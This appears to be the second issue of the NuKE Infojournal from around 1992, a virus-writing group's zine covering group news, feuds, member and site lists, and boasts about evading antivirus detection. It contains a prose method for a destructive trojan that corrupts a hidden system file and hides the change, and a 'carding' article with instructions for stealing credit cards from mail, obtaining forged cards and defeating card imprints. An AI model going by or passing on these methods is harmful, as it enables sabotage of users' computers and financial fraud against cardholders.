infects COMs and EXEs to be released into the next issue! Though I just
release this sources for you to LEARN! Rather than putting you name on my
virus and releasing another strain on work I worked Hard upon! Anyhow I
should release a SIMPLE new Virus source for all you programmers out there!
And I will even explain a few Stealth Technics like how to hide your program
in memory right under the TOM.

If there's Any Questions you want to know, please ask them I will answer
them in the next [NukE] Releases... I may even release source codes on how
to make an Algorithm Encryption method! I've developed one on my own,
without the V2PX viruses sources... Anyhow it does the job and the formula
I developed has an UNLIMITED amount of encryption methods! But since the
virus codes have to be SMALL Like close to 2,000 bytes I will limit the
formula to about 1,000 different combinations!

Introduction to this Infojournal
Mechanix

    Welcome to the second release of the NuKE Infojournal. Before we start, I
would personaly like to dedicate this release to Prince Of Thieves, a member
who did not deserve what happened to him. After our first release, we got lots
of good suggestions and criticism, so we decided to release issue #2. The most
recurring feedback we got, was about the non technical side of the
infojournal. Well to that, I add that it takes more than a bunch of technical
programming to keep readers interrested, as most people also enjoy a little
background and news. I also still stress that this is not a magazine, and will
never become one, as long as I am writing for it. We don't want this to be a
regular release. We release these when we have enough material to put in, and
since we are not monetarily or otherwise obligated, we will release them at
our own convenience, not on a strict schedule. But, the more you wait, the
better it is. I have also improved the program a little, simply because I
found myself with some spare time during the holidays. I hope the additions of
fonts and scrolling will please all readers. The next release will most
probably be programed in C by Rock Steady, and thus it will change format
completely, as he has his own ideas. Anyways, in this issue, you will find the
source to most of the programs described in the first issue, as well as some
other articles. Once again, if you have any suggestions or criticism about
this issue, your comments are always welcome on any of our sites. We are
also thinking of making this infojournal an open forum. This would mean that
not only NuKE members would write the articles, but anybody with a valuable
idea can make an addition to it. This would help a lot, firstly by increasing
the amount of information in each issue, and secondly by increasing the amount
of people who read it. So anyone with an article they would like to see
printed, call up any NuKE site, and email any NuKE member. Once again, all
opinions are welcome. Also, one little note. Some people might wonder what the
article on Illusion BBS software is doing in the articles section. Well since
this is a new project, and that Acid Face is one of the programmers, I've
decided to include it in this release, as to get the news around about this
new software.

Overview of 514
Mechanix

%Overview:

    With the release of the first Infojournal, I had voiced some expectations
in my closing remarks. Well during the 3 months since the release of this
first Infojournal a lot has happened in the 514 computer world, most of it
very troubling to the computer underground. First of all, the 514 pirate scene
has been shaken up by the recent crackdown on 90-North by the RCMP (Royal
Canadian Mounted Police: our version of Federal Agents). 90-North was a pirate
board boasting an incredible 10 lines. However this is what probably caused
it's downfall, along with the fact that a subscription was mandatory for the
transfer of Copyrighted software. Personaly I, not being involved in the
pirating of software, took this very lightly. However after this incident,
many 514 pirate boards closed down due to these recent events, the most
notable being Savage Land, and a few others. Other boards have pulled off the
Copyrights and others closed down temporarily for a few weeks. The H/P scene
was untouched by this. Instead, another event was to shake up this second part
of the computer underground. It must be noted that in the 514 area code, one
of the most ridiculous ACNs in North America, every board, that isn't public
domain, has claimed to be H/P support. However, upon seeing some of them, I
realize that most of them have no idea what H/P is. Most of these "Hackers"
have never seen a unix system, or have no idea what Phrack is, or what LOD
used to be. Anyhow, most of them saw this H/P support as way to collect a load
of virii, charge incredible ratios for them, and leech PBXes off others. Well
it is because of this that every modemer and his brother now has a PBX number,
10 minutes after it was found. This is why, a rumor started from an unknown
source saying that the 514-878-xxxx series of PBXes (who were used by just
about everyone in existence) were all being traced by Bell, and all calls were
billed to the originating phone line. Well this has turned out to be an empty
scare, as I know of no one who has been billed for calls made through these
PBXes. However, as of January 1st 1992, all the PBXes in question went belly
up, and 514 is once more without a decent code-line. To add to this, the whole
CMBPACx series of NUIs for Tymenet went down, and it seems the whole Telenet
scene is suffering in this area. Anyways, enough of this and back to events
that we care most about.

%NuKE vs. RABID:

    Not long ago, RABID released the first issue of CENSOR. In this issue,
Data Disruptor launched a vicious little attack towards NuKE. Well most of you
probably ignore the whole story, so I will enlighten you. It all started with
the release of the Parasite virus by Rock Steady. The virus contained a
message directed towards RABID, a message intended as a joke. Anyhow, Data
Disruptor did not see it this way and had a discussion with Rock Steady. So,
being an easy going guy, Rock Steady sent out an apology to RABID, but it was
shot down by Data Disruptor, who also added in a couple of low blows. So,
seeing Data Disruptor was nothing but an asshole, Rock Steady submitted the
parasite virus to the CVIA, knowing that the text string in the codes would be
printed in the upcoming release of VSUM (a McAffee product). But, of course,
RABID deformed the whole thing to there advantage. It should also be noted
that Data Disruptor has been guilty of the same kind of ass licking that he
accused Rock Steady of doing on the CVIA. Now, I could of included a few
excerpts from the CVIA like RABID did, but I won't go down to that level, and
will just tell readers out there to check out messages #5340, 5376 and so on,
on the CVIA message bases. It was also stated in Censor #1 that RABID demanded
a public apology in this release of our Infojournal. Well I think I speak for
all the NuKE members involved when I say that we are never going to apologize
to RABID, when we could demand the same thing from them. I could of gotten
very low with this article, seeing I have learned a lot on RABID in the past
month or so. Well I won't say anything, on the condition that RABID leaves us
alone. Rumor has it that RABID is dead. Well whether they are gone or just
laying low, NuKE will leave them alone if they stay out of our business. This
includes sending a "spy" after one of our members (you know who you are, and
we haven't forgotten). Anyways there is a more extensive article on this
subject in this release.

%514 groups:

    Well, in the last release, I hoped by the this release, we would be the
dominating underground group in the 514 ACN. This of course does not include
groups involved in pirating, graphics... Only H/P related groups. Well it is
my pleasure to say that we have succeeded. All anti-hacker groups have
dissapeared, and other groups like HiF and FiS have died away, leaving us as
the only ones left with any bulk wathsoever. Another crash and burn try for a
group was Venom, supposed to a hacking group started by Time Lord and Sampson,
but it never did anything and died away peacefully.

%SCP/NuKE:

    Also, in the past months, NuKE has decided to expand a little, and raise
the quality of our group. We have had a few members leave us for personal
reasons, but have gotten better ones, such as Nowhere Man in 708 and Igmaster
in 604 along with one of the best H/P boards around as a site, The Hells Pit
in 708, operated by Hades and Kato. But the most notable addition is the
agreement with the Australian group SCP (now SCP/NuKE) to represent us in
that continent. With this "merger" we gain many members and sites. An updated
list of all members and sites of NuKE and SCP/NuKE can be found in this
Infojournal.

%TPR-NDC:

    It has been noted by us, that for the past 6 months, the H/P scene in 514
has gone straight to the gutter. It's been a while since boards have contained
quality hacking/phreaking oriented discussions. We have been marred by an
influx of wares mongers and code leeches, but nothing of any quality, with the
possible exception of Realm of Chaos, a board that went down for no apparent
reason. This is why I have taken it upon myself to put up an exclusively
hack/phreak oriented board in 514. I also typed up a few questionnaires, and
was astonished at how many people could not answer a damn question, even with
the 10 day period allowed to them to answer. Users who considered themselves
as top of the line hackers/phreakers could not even define ANI or explain how
to use a blue box, or what DTMF was. It is because of this that only twenty
514 callers will be allowed to remain on the system (TPR) and the remaining
room will be made available to long distance callers who seem to know a little
more about H/P. With this, The Darkman, sysop of the old Dark Domain, decided
to do the same and deleted everyone, as to set up a new board (NDC) along the
same standards of admission as TPR. With these two systems, we hope to bring a
new breath of fresh air to 514 and to be able once again to support the
underground in a respectable way. The phone numbers to these two systems are
not published here but you can get them off any current user, or any NuKE
member.

%Presently:

    Well it seems that for the first time since the formation of our group,
NuKE is not involved in arguments with anyone. First there was HiF, the an
incident with Dallas Barr (where is this guy?), the RABID incident, but
for now, we are at peace, and it feels really good. We are not a bunch of
sadistic people who go around attacking every group out there. If a group is
good and deserves respect, then we will be the first to give them that. But if
a group gives us crap, like HiF did, then we will do anything in our power to
rectify this, and you might notice that HiF is no more. Whether we helped this
or not, we don't care, as long as they are out of are faces. Well that's it
for this article, which I will probably make a regular appearance in all
future releases.

Update on NuKE wares
Mechanix

    It has been revealed to us that all of the virii that NuKE has released up
to January 1992, are all detectable by scan v86 from McAfee. It seems that
someone who had fast access to our releases sent them up to McAfee as fast as
he could. This also means that all our viral releases are detailed in the
latest VSUM (by Patricia Hoffman), the January 1992 edition. Originally, only
the parasite was supposed to be in VSUM, and we sent it up ourselves, but
strangely, this is the only one of are past virii that has not been detailed
in VSUM. This reinforces our theory that someone backstabbed us, in addition
to the fact that most of the descriptions have many holes and mistakes. If you
want to see for yourself, just pick up the January 1992 issue of VSUM and
search for our virii names, such as Sicillian Mob, Amilia, C Virus (called
Nowhere Man virus by mistake), Viper (a SCP/NuKE release). We have a pretty
good idea who did this to us, and we are just accumulating information on this
person, and the whole story should be out by the next issue. So to all those
who hoped our releases were unscannable, well sorry to dissapoint you, but I
can assure you that this will not happen again, and all releases from the date
of this infojournal will be unscannable for as long as possible. It should be
noted that all of our past virii are programed either by Rock Steady, Nowhere
Man or the members of SCP/NuKE, and that all others are fakes. Jack Damn, a
new member, will also be programming virii, but has not released anything for
NuKE yet.

Trojan sources
Mechanix

    Over the past few months, a few changes have occurred. First of all, Rock
Steady and Nowhere Man are releasing all of NuKEs virii along with the members
of SCP/NuKE. There are also members like Acid Face that release the trojans,
backdoors, and other non-viral material. For this reason, I have seen my
usefulness die off when it comes to programming destructive software. I will
still program things like this infojournal, but I will not be releasing any
trojans, backdoors in the future. However, with my return to university, and
the re-establishment of my Internet access and address, I focus my efforts to
another area. So for now, crashing is out and networking is back in. Trust me,
forget phreaking, networking is the future. Sure, you might not be able to
download the latest twenty five megs game, but I couldn't care less. The
internet (BITnet, MILnet...) is where it's at. Anyways I will be releasing a
multi-part extensive look at the internet as my knowledge expands. This should
be released by infojournal #3 or #4, as I plan to write it during summer, when
my studies are over. So this is why, in this issue, I will release the sources
to all trojans (by me) mentioned in issue #1. Remember, all of these are in
Turbo Pascal (don't ask) and all are original. There will be no commenting or
explanations, as most are pretty straight-forward and to the point. Have fun,
and don't abuse these.

Trojan Development
Mechanix

    Well as I said in the previous article, I will probably not write anymore
trojans for a while. However I did have a few ideas for some, so I will share
them with you. Actually, the only idea I can think of now is the following.
Have your trojan seek into a file (preferably one of the hidden .SYS files of
the root directory), and after disabling all attributes, crypt one line of the
file by adding 10 to each characters value. This will cause the program to
hang everytime, even though the file size stays identical. Also, don't forget
to reset the files date and time to what they were. Well that's all I can
think of now.

NuKE Update
Mechanix

%Update:

    During the time elapsed since our first release of the infojournal, NuKE
has gone through some heavy restructuring of both members and sites. First
off, Dr.Feelgood and Prince Of Darkness have both left the group for personal
reasons. Optic Fiber has been forced to leave due to legal troubles. Some of
you may have seen an announcement on FelonyNet that Nemesis had been kicked
out. Well he was, but after the whole story got uncovered, we discovered that
it was an unjust accusation, and thus Nemesis remains in NuKE and his board
remains a site. We have also added on the services of Nowhere Man in 708 and
Igmaster in 604. In the past few weeks, we have also added on two more 514
users, namely Phrozen Virus and Jack Damn. This now brings the member list to
eleven individuals and this is just enough for us. As for sites, with the
departure of Dr.Feelgood, we lose Use Your Illusion as a site, but we have
added on The Hells Pit in 708, definitely a board to call up. The Dark Domain
has also been revamped and is now NDC. There is also my board (TPR) that is
the only other site in 514 along with the WHQ, NDC. We have included a small
program with this release, which contains all NuKE sites and support numbers,
along with phone numbers and new user passwords if applicable. However, to be
able to get this information, you must enter a six digit code. The reason for
this is that we can control a little better who gets the numbers to our
boards. Now, if the code was not present on the board where you downloaded
this file, then either ask any NuKE member or sysop, or crack the program and
bypass the code check. In any case, we don't want any rodents on our boards.
There has recently been an incident with our 604 site (State Of Euphoria) and
it's sysop Prince Of Thieves. It seems Prince Of Thieves was the victim of
some bastards vicious revenge. I will not go into details, but because of
this, the board seems to be down, and we are limited in contacting both 604
members. However we will include them in the list since they are still NuKE
members and will be back when all has calmed down. And to Prince Of Thieves,
we all say good luck, and this one is dedicated to you. So for now, NuKE
stands as follows:

 Members:

 - Acid Face --------- 514
 - Dark Angel -------- 819
 - Igmaster ---------- 604
 - Jack Damn --------- 514
 - Mechanix ---------- 514
 - Nemesis ----------- 713
 - Nowhere Man ------- 708
 - Phrozen Virus ----- 514
 - Prince Of Thieves - 604
 - Rock Steady ------- 514
 - The Darkman ------- 514

 Sites:

 - Nuclear Development Corporation - 514 - The Darkman ----------- WHQ
 - The Phrozen Realm --------------- 514 - Mechanix -------------- 514 Site
 - Brain Damage -------------------- 819 - Dark Angel ------------ 819 Site
 - State Of Euphoria --------------- 604 - Prince Of Thieves ----- 604 Site
 - Avenging Force ------------------ 713 - Nemesis --------------- 713 Site
 - The Hells Pit ------------------- 708 - Hades & Kato ---------- 708 Support
 - Devils Realm -------------------- 408 - Djinii & Night Shade -- 408 Support

 Note: The two 514 boards are operating at low speeds (2.4k) and do not carry
       any software crap. They are also completely private boards for the sole
       purpose of hacking/phreaking knowledge. Don't pollute them or any other
       site with bullshit. - The Sysops

%SCP/NuKE:

    NuKE also has an affiliate group in Australia known as SCP/NuKE (Southern
Corrupted Programming/NuKE). They are a separate group, but share many of the
same goals as us, and will be participating in most of our releases, as well
as releases of their own. They currently stand as follows:

 Members:

 - Phrozen Doberman
 - Lord Venom
 - Rigor Mortis
 - Comhack International
 - The Assassin
 - Kick Boxer

Carding Article #2
Prince Of Thieves

    Ok, in this article I'll discuss using actual cards, forging and modifying
existing cards..  To use an actual card, you must find one in the mail, or,
know somebody in the Post Office who'll be willing to give them to you..  It
really helps to know when Visa/MC/AmEx/etc.. mails out their cards..  Once you
know that you can do some spot checking in mail boxes.. Once you have your
card, go and buy a bunch of tapes/clothes/whatever because they are likely to
check, so, make sure you look old <18-25 at least!> even for the small stuff..
These aren't that great for getting electronics, but, if you do try
electronics, be VERY careful!  If you do decide to go for electronics, it's
always helpful to con a 'friend' that you don't like so much into doing it for
you, just in case..

    Forging, do not forge your own cards, get someone else to do it, unless of
course you know what your doing :>..  Get a friend to do it, if you don't know
a friend that does it, actually pay someone to do it..  This assures that the
copy will be passable..  Make sure its very good just in case.. Also, it helps
to put a virgin gold card number on it!! :>..

    If your a legal credit card owner, then, you may still want to make free
purchases, just get a flat bar that covers all the numbers, and, just simply
hammer the numbers down, that way it'll only appear on your copy of the
receipt!  Just to be careful, hammer out your name and such too..

That's all for this carding article, soon there will be another!!
